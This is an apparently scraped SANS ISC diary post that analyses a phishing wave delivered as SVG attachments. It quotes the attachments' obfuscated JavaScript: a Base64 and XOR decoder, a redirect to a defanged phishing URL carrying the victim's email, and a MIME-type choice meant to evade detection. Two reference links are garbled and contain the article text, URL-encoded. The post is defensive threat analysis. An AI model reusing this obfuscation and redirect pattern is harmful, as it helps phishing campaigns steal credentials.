---
ai_commentary: []
ai_commentary_meta:
  content_digest: ''
  generated_at: ''
  model: ''
  prompt_version: ''
  provider: ''
category: ai-security
date: '2026-06-09T04:29:11.337282+00:00'
exported_at: '2026-06-09T04:29:13.896141+00:00'
feed: https://isc.sans.edu/rssfeed.xml
language: en
source_url: https://isc.sans.edu/diary/rss/33040
structured_data:
  about: []
  author: ''
  description: 'New Wave Of Phishing Emails with SVG Files, Author: Xavier Mertens'
  headline: New Wave Of Phishing Emails with SVG Files, (Tue, Jun 2nd)
  inLanguage: en
  keywords: []
  main_image: ''
  original_source: https://isc.sans.edu/diary/rss/33040
  publisher:
    logo: /favicon.ico
    name: GTCode
title: New Wave Of Phishing Emails with SVG Files, (Tue, Jun 2nd)
updated_at: '2026-06-09T04:29:11.337282+00:00'
url_hash: 87209772c42df1adf82be6da6b7e77824f69f037
---

For a few days, my SANS ISC mailbox is flooded with emails that delivers SVG files. An SVG ("Scalable Vector Graphic") is a web-friendly vector file format used for graphics and icons. No URL in the body, just “an image”, that’s the perfect way to deliver some malicious content. This isn’t the first time that we see this technique used by threat actors[
[1](https://isc.sans.edu/diary/Increase+In+Phishing+SVG+Attachments/31456)
].

This time, the SVG files are really simple and even don’t contain any graphical element but a simple piece of JavaScript that will redirect the victim's browser to the phishing page:

![](https://isc.sans.edu/diaryimages/images/isc-20260602-1.png)

With the current wave, I just detected regular phishing pages but it could be any payload.

The variable “nl” contains the targeted email address:

```
nl = '$aGFuZGxlcnNAc2Fucy5lZHU='; // “[email protected]”
```

The interesting payload is in “oa”, it contains a Base64-encode and XOR’d string. The XOR key is in “bd”:

```
const pt = "b19208caeefa";
const rm = "51d1e7dcd384";
const bd = pt + rm;
```

The payload is decoded here:

```
const cx = ['b', 'style', 'o', 't', 'a'];
const kf = self[[cx[4], cx[3], cx[2], cx[0]].join('')];
const ts = kf(oa);
const rabbit = Uint8Array.from(ts, (aa, ak) =&gt;
    aa.charCodeAt(0) ^ bd.charCodeAt(ak % bd.length)
);
```

Finally, the variable “rabbit” is used to perform the redirect in the browser:

```
window.location.href = "hxxps://chinougoo[.]cfd/W74rH61S!x7sbhhS0bKPv/" + "[email protected]";
```

This technique works because SVG files are handled by the browser by default on the Windows operating system. Note the TLD used (".cfd") which means "Clothing, Fashion, and Design". It's a cheap TLD more and more abused in phishing campaigns[
[2](https://radar.cloudflare.com/tlds/cfd?dateRange=7d)
].

A final note about the MIME type used in the SVG file:

```
&lt;script type="application/ecmascript"&gt;
```

This is a official MIME type for ECMAScript, the standardized specification underlying JavaScript (standard ECMA-262)[
[3](http://For%20a%20few%20days,%20my%20SANS%20ISC%20mailbox%20is%20flooded%20with%20emails%20that%20delivers%20SVG%20files.%20An%20SVG%20("Scalable%20Vector%20Graphic")%20is%20a%20web-friendly%20vector%20file%20format%20used%20for%20graphics%20and%20icons.%20No%20URL%20in%20the%20body,%20just%20?an%20image?,%20that?s%20the%20perfect%20way%20to%20deliver%20some%EF%BF%BDmalicious%20content.%20This%20isn?t%20the%20first%20time%20that%20we%20see%20this%20technique%20used%20by%20threat%20actors[1].%20%20This%20time,%20the%20SVG%EF%BF%BDfiles%20are%20really%20simple%20and%20even%20don?t%20contain%20any%20graphical%20element%20but%20a%20simple%20piece%20of%20JavaScript%20that%20will%20redirect%20the%20browser%20to%20the%20phishing%20page:%20%20%20%20With%20the%20current%20wave,%20I%20just%20detected%20regular%20phishing%20pages%20but%20it%20could%20be%20any%20payload.%20%20The%20variable%20?nl?%20contains%20the%20targeted%20email%20address:%20%20nl%20=%20'$aGFuZGxlcnNAc2Fucy5lZHU=';%20//%20?handlers@sans.edu?%20The%20interesting%20payload%20is%20in%20?oa?,%20it%20contains%20a%20Base64-encode%20and%20XOR?d%20string.%20The%20XOR%20key%20is%20in%20?bd?:%20%20const%20pt%20=%20"b19208caeefa";%20const%20rm%20=%20"51d1e7dcd384";%20const%20bd%20=%20pt%20+%20rm;%20The%20payload%20is%20decoded%20here:%20%20const%20cx%20=%20['b',%20'style',%20'o',%20't',%20'a'];%20const%20kf%20=%20self[[cx[4],%20cx[3],%20cx[2],%20cx[0]].join('')];%20const%20ts%20=%20kf(oa);%20const%20rabbit%20=%20Uint8Array.from(ts,%20(aa,%20ak)%20=&gt;%20%20%20%20%20aa.charCodeAt(0)%20^%20bd.charCodeAt(ak%20%%20bd.length)%20);%20Finally,%20the%20variable%20?rabbit?%20is%20used%20to%20perform%20the%20redirect%20in%20the%20browser:%20%20window.location.href%20=%20"hxxps://chinougoo[.]cfd/W74rH61S!x7sbhhS0bKPv/"%20+%20"handlers@sans.edu";%20This%20technique%20works%20because%20SVG%20files%20are%20handled%20by%20the%20browser%20by%20default%20on%20the%20Windows%20operating%20system.%20Note%20the%20TLD%20used%20(".cfd")%20which%20means%20"Clothing,%20Fashion,%20and%20Design".%20It's%20a%20cheap%20TLD%20more%20and%20more%20abused%20in%20phishing%20campaigns.%EF%BF%BD%20%20A%20final%20note%20about%20the%20MIME%20type%20used%20in%20the%20SVG%20file:%EF%BF%BD%20%20&lt;script%20type="application/ecmascript"&gt;%20This%20is%20a%20official%20MIME%20type%20for%20ECMAScript,%20the%20standardized%EF%BF%BDspecification%20underlying%20JavaScript%20%20application/ecmascript%EF%BF%BDis%20an%20IANA-registered%20MIME%20type%20for%EF%BF%BDECMAScript,%20which%20is%20the%20standardized%20specification%20underlying%20JavaScript%20(standardized%20by%20ECMA%20International%20as%20ECMA-262).%20%20Key%20Points%20%20It's%20essentially%20JavaScript.%EF%BF%BDECMAScript%20is%20the%20spec;%20JavaScript%20(and%20engines%20like%20V8,%20SpiderMonkey)%20are%20implementations%20of%20it.%20In%20practice,%EF%BF%BDapplication/ecmascript%EF%BF%BDand%EF%BF%BDapplication/javascript%EF%BF%BD(or%EF%BF%BDtext/javascript)%20are%20functionally%20interchangeable%20in%20browsers.%20%20RFC%20history:%EF%BF%BDIt%20was%20formally%20registered%20via%20RFC%204329%20(2006),%20alongside%EF%BF%BDapplication/javascript.%20RFC%204329%20was%20later%20obsoleted%20by%20RFC%209239%20(2022),%20which%20standardized%EF%BF%BDtext/javascript%EF%BF%BDas%20the%EF%BF%BDone%20correct%20MIME%20type%EF%BF%BDfor%20scripts,%20deprecating%20all%20others%20including%EF%BF%BDapplication/ecmascript.%20%20Why%20it%20matters%20for%20this%20SVG:%EF%BF%BDUsing%EF%BF%BDapplication/ecmascript%EF%BF%BDinstead%20of%20the%20more%20common%EF%BF%BDtext/javascript%EF%BF%BDis%20a%20minor%20evasion%20trick%20?%20some%20older%20security%20tools%20or%20WAFs%20that%20pattern-match%20on%EF%BF%BDtext/javascript%EF%BF%BDor%EF%BF%BDapplication/javascript%EF%BF%BDwould%20miss%20it,%20while%20browsers%20still%20execute%20it%20just%20fine%20since%20they%20treat%20both%20identically.%20%20It's%20a%20small%20but%20deliberate%20choice%20by%20the%20malware%20author%20to%20reduce%20the%20chance%20of%20signature-based%20detection%20flagging%20the%20script%20block.%20%20%20%20%20[1]%20https://isc.sans.edu/diary/Increase+In+Phishing+SVG+Attachments/31456%20[2]%EF%BF%BDhttps://radar.cloudflare.com/tlds/cfd?dateRange=7d%20[3]%EF%BF%BDhttps://github.com/sudheerj/ECMAScript-features%20%20Xavier%20Mertens%20(@xme)%20Xameco%20Senior%20ISC%20Handler%20-%20Freelance%20Cyber%20Security%20Consultant%20PGP%20Key)
]. This has been used probably to defeat some common security controls that are looking for "JavaScript".

[1]
&lt;https://isc.sans.edu/diary/Increase+In+Phishing+SVG+Attachments/31456&gt;

[2]
&lt;https://radar.cloudflare.com/tlds/cfd?dateRange=7d&gt;

[3]
[https://github.com/sudheerj/ECMAScript-features](http://For%20a%20few%20days,%20my%20SANS%20ISC%20mailbox%20is%20flooded%20with%20emails%20that%20delivers%20SVG%20files.%20An%20SVG%20("Scalable%20Vector%20Graphic")%20is%20a%20web-friendly%20vector%20file%20format%20used%20for%20graphics%20and%20icons.%20No%20URL%20in%20the%20body,%20just%20?an%20image?,%20that?s%20the%20perfect%20way%20to%20deliver%20some%EF%BF%BDmalicious%20content.%20This%20isn?t%20the%20first%20time%20that%20we%20see%20this%20technique%20used%20by%20threat%20actors[1].%20%20This%20time,%20the%20SVG%EF%BF%BDfiles%20are%20really%20simple%20and%20even%20don?t%20contain%20any%20graphical%20element%20but%20a%20simple%20piece%20of%20JavaScript%20that%20will%20redirect%20the%20browser%20to%20the%20phishing%20page:%20%20%20%20With%20the%20current%20wave,%20I%20just%20detected%20regular%20phishing%20pages%20but%20it%20could%20be%20any%20payload.%20%20The%20variable%20?nl?%20contains%20the%20targeted%20email%20address:%20%20nl%20=%20'$aGFuZGxlcnNAc2Fucy5lZHU=';%20//%20?handlers@sans.edu?%20The%20interesting%20payload%20is%20in%20?oa?,%20it%20contains%20a%20Base64-encode%20and%20XOR?d%20string.%20The%20XOR%20key%20is%20in%20?bd?:%20%20const%20pt%20=%20"b19208caeefa";%20const%20rm%20=%20"51d1e7dcd384";%20const%20bd%20=%20pt%20+%20rm;%20The%20payload%20is%20decoded%20here:%20%20const%20cx%20=%20['b',%20'style',%20'o',%20't',%20'a'];%20const%20kf%20=%20self[[cx[4],%20cx[3],%20cx[2],%20cx[0]].join('')];%20const%20ts%20=%20kf(oa);%20const%20rabbit%20=%20Uint8Array.from(ts,%20(aa,%20ak)%20=&gt;%20%20%20%20%20aa.charCodeAt(0)%20^%20bd.charCodeAt(ak%20%%20bd.length)%20);%20Finally,%20the%20variable%20?rabbit?%20is%20used%20to%20perform%20the%20redirect%20in%20the%20browser:%20%20window.location.href%20=%20"hxxps://chinougoo[.]cfd/W74rH61S!x7sbhhS0bKPv/"%20+%20"handlers@sans.edu";%20This%20technique%20works%20because%20SVG%20files%20are%20handled%20by%20the%20browser%20by%20default%20on%20the%20Windows%20operating%20system.%20Note%20the%20TLD%20used%20(".cfd")%20which%20means%20"Clothing,%20Fashion,%20and%20Design".%20It's%20a%20cheap%20TLD%20more%20and%20more%20abused%20in%20phishing%20campaigns.%EF%BF%BD%20%20A%20final%20note%20about%20the%20MIME%20type%20used%20in%20the%20SVG%20file:%EF%BF%BD%20%20&lt;script%20type="application/ecmascript"&gt;%20This%20is%20a%20official%20MIME%20type%20for%20ECMAScript,%20the%20standardized%EF%BF%BDspecification%20underlying%20JavaScript%20%20application/ecmascript%EF%BF%BDis%20an%20IANA-registered%20MIME%20type%20for%EF%BF%BDECMAScript,%20which%20is%20the%20standardized%20specification%20underlying%20JavaScript%20(standardized%20by%20ECMA%20International%20as%20ECMA-262).%20%20Key%20Points%20%20It's%20essentially%20JavaScript.%EF%BF%BDECMAScript%20is%20the%20spec;%20JavaScript%20(and%20engines%20like%20V8,%20SpiderMonkey)%20are%20implementations%20of%20it.%20In%20practice,%EF%BF%BDapplication/ecmascript%EF%BF%BDand%EF%BF%BDapplication/javascript%EF%BF%BD(or%EF%BF%BDtext/javascript)%20are%20functionally%20interchangeable%20in%20browsers.%20%20RFC%20history:%EF%BF%BDIt%20was%20formally%20registered%20via%20RFC%204329%20(2006),%20alongside%EF%BF%BDapplication/javascript.%20RFC%204329%20was%20later%20obsoleted%20by%20RFC%209239%20(2022),%20which%20standardized%EF%BF%BDtext/javascript%EF%BF%BDas%20the%EF%BF%BDone%20correct%20MIME%20type%EF%BF%BDfor%20scripts,%20deprecating%20all%20others%20including%EF%BF%BDapplication/ecmascript.%20%20Why%20it%20matters%20for%20this%20SVG:%EF%BF%BDUsing%EF%BF%BDapplication/ecmascript%EF%BF%BDinstead%20of%20the%20more%20common%EF%BF%BDtext/javascript%EF%BF%BDis%20a%20minor%20evasion%20trick%20?%20some%20older%20security%20tools%20or%20WAFs%20that%20pattern-match%20on%EF%BF%BDtext/javascript%EF%BF%BDor%EF%BF%BDapplication/javascript%EF%BF%BDwould%20miss%20it,%20while%20browsers%20still%20execute%20it%20just%20fine%20since%20they%20treat%20both%20identically.%20%20It's%20a%20small%20but%20deliberate%20choice%20by%20the%20malware%20author%20to%20reduce%20the%20chance%20of%20signature-based%20detection%20flagging%20the%20script%20block.%20%20%20%20%20[1]%20https://isc.sans.edu/diary/Increase+In+Phishing+SVG+Attachments/31456%20[2]%EF%BF%BDhttps://radar.cloudflare.com/tlds/cfd?dateRange=7d%20[3]%EF%BF%BDhttps://github.com/sudheerj/ECMAScript-features%20%20Xavier%20Mertens%20(@xme)%20Xameco%20Senior%20ISC%20Handler%20-%20Freelance%20Cyber%20Security%20Consultant%20PGP%20Key)

Xavier Mertens (@xme)

Xameco

Senior ISC Handler - Freelance Cyber Security Consultant

[PGP Key](https://raw.githubusercontent.com/xme/pgp/refs/heads/main/public.key)